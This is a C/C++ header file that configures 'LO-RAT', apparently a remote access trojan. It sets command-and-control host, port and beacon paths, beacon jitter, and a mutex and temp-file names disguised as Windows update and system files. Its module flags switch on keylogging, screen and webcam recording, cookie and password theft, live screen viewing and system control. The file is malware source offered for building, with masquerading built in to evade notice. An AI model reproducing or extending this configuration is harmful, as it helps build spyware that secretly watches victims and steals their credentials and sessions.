#pragma once
// =============================================================================
// LO-RAT Core Configuration
// Patched at build-time by the C# Builder or Go server
// =============================================================================

#define C2_HOST             "127.0.0.1"
#define C2_PORT             8443
#define C2_BEACON_PATH      "/beacon"
#define C2_UPLOAD_PATH      "/upload"
#define C2_WS_SCREEN_PATH   "/ws/screen"

#define MUTEX_NAME          "Global\\WindowsUpdateCore_v2"
#define USER_AGENT          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

#define BEACON_INTERVAL_MS  30000
#define BEACON_JITTER_MS    5000

#define LOG_PATH            "C:\\Windows\\Temp\\syslog.bin"
#define SCREEN_CACHE_PATH   "C:\\Windows\\Temp\\scrcache"
#define WEBCAM_CACHE_PATH   "C:\\Windows\\Temp\\camcache"

#define AES_KEY_SIZE        32
#define RSA_KEY_SIZE        2048

#define SCREEN_QUALITY      80
#define SCREEN_FPS          10
#define LIVE_SCREEN_PORT    0   // 0 = auto-assign

#define MAX_LOG_SIZE        1048576  // 1MB before flush

// Module enable flags (patched by builder)
#define MODULE_KEYLOGGER    1
#define MODULE_SCREEN_REC   1
#define MODULE_WEBCAM_REC   1
#define MODULE_COOKIE_STEAL 1
#define MODULE_PASS_STEAL   1
#define MODULE_LIVE_SCREEN  1
#define MODULE_WIFI_INFO    1
#define MODULE_NET_SPREAD   0
#define MODULE_SYSTEM_CTRL  1